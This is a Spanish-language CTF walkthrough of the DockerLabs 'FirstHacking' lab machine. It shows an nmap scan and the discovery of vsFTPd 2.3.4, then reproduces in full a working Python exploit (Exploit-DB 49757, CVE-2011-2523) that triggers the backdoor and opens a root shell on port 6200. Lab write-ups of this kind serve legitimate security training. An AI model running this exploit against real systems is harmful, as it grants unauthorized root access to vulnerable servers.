---
title: CTF-DockerLabs-FirstHacking
published: true
---

## WriteUps maquina FirstHacking de DockerLabs

---
tags:
  - CTF
  - estado/completado
  - plataforma: [DockerLabs]
  - dificultad: Muy fácil
  - autor: [ElPinguinoDeMario]

# Datos

[!INFO] FirstHacking
>  **Nombre:** FirstHacking
>  **SO:** Linux
>  **Dificultad:** Muy fácil
>  **Enlace:** [Dockerlabs](https://dockerlabs.es/)

[!TODO] Objetivo
> 🚩Ingresar a la maquina como algún usuario.
> 🚩Elevar privilegios una vez obtenido el acceso.

El primer paso consiste en iniciar la máquina, lo cual es tan sencillo como ejecutar el siguiente comando después de haber descargado la maquina:

```bash
└─$ sudo bash auto_deploy.sh firsthacking.tar
```

# Reconocimiento

> Una vez iniciada la maquina, el mismo script de inicio me da la dirección IP a lo cual procedo a realizar un escaneo de puertos de la maquina y el resultado es el siguiente:

```bash
└─# nmap 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-22 23:56 EDT
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

Esta maquina muestra el `puerto 21` abierto que corresponde al servicio `ftp`, es un puerto diferente al resto de maquinas de la categoría _muy fácil_, lo primero que intento es ver si puedo conectarme con el usuario `anonymous`

![FTPFirstHacking.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/FTPFirstHacking.png)

El intento es fallido, sin embargo esto me ha dado la versión del servicio, el cual es: `vsFTPd 2.3.4`, ahora busco un poco de información en Google, quizás pueda encontrar algún exploit, alguna vulnerabilidad para esta versión.

Y en efecto, el segundo resultado me muestra un exploit en: [www.exploit-db.com](https://www.exploit-db.com/) a lo que procedo a chequear y obtengo el siguiente código, identificado con el código: `49757`

```python
# Exploit Title: vsftpd 2.3.4 - Backdoor Command Execution
# Date: 9-04-2021
# Exploit Author: HerculesRD
# Software Link: http://www.linuxfromscratch.org/~thomasp/blfs-book-xsl/server/vsftpd.html
# Version: vsftpd 2.3.4
# Tested on: debian
# CVE : CVE-2011-2523

#!/usr/bin/python3   
                                                           
from telnetlib import Telnet 
import argparse
from signal import signal, SIGINT
from sys import exit

def handler(signal_received, frame):
    # Handle any cleanup here
    print('   [+]Exiting...')
    exit(0)

signal(SIGINT, handler)                           
parser=argparse.ArgumentParser()        
parser.add_argument("host", help="input the address of the vulnerable host", type=str)
args = parser.parse_args()       
host = args.host                        
portFTP = 21 #if necessary edit this line

user="USER nergal:)"
password="PASS pass"

tn=Telnet(host, portFTP)
tn.read_until(b"(vsFTPd 2.3.4)") #if necessary, edit this line
tn.write(user.encode('ascii') + b"\n")
tn.read_until(b"password.") #if necessary, edit this line
tn.write(password.encode('ascii') + b"\n")

tn2=Telnet(host, 6200)
print('Success, shell opened')
print('Send `exit` to quit shell')
tn2.interact()
            
```

Así que creo mi archivo en python llamado: `49757.py` le doy su permiso de ejecución con: `chmod +x 49757.py` y lo ejecuto sin más para ver que me mostraba.

Y lo primero que me indica es que solo debo indicarle la dirección IP del objetivo:

`49757.py: error: the following arguments are required: host`

Procedo con ello y listo, de todas las maquinas esta fue la más fácil ya que tampoco existe otro usuario y adicional somos root dentro de la maquina.

# pwned

![FirstHackingPWNED.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/

# Comandos

[!IMPORTANT] Resumen de comandos utilizados
> `sudo bash auto_deploy.sh vacaciones.tar`
> `nmap 172.17.0.2`
> `ftp 172.17.0.2`
> `python 49757.py 172.17.0.2`


```
¡Que la fuerza del hacking ético nos acompañe! :)
```

|   |
|:--|
|   |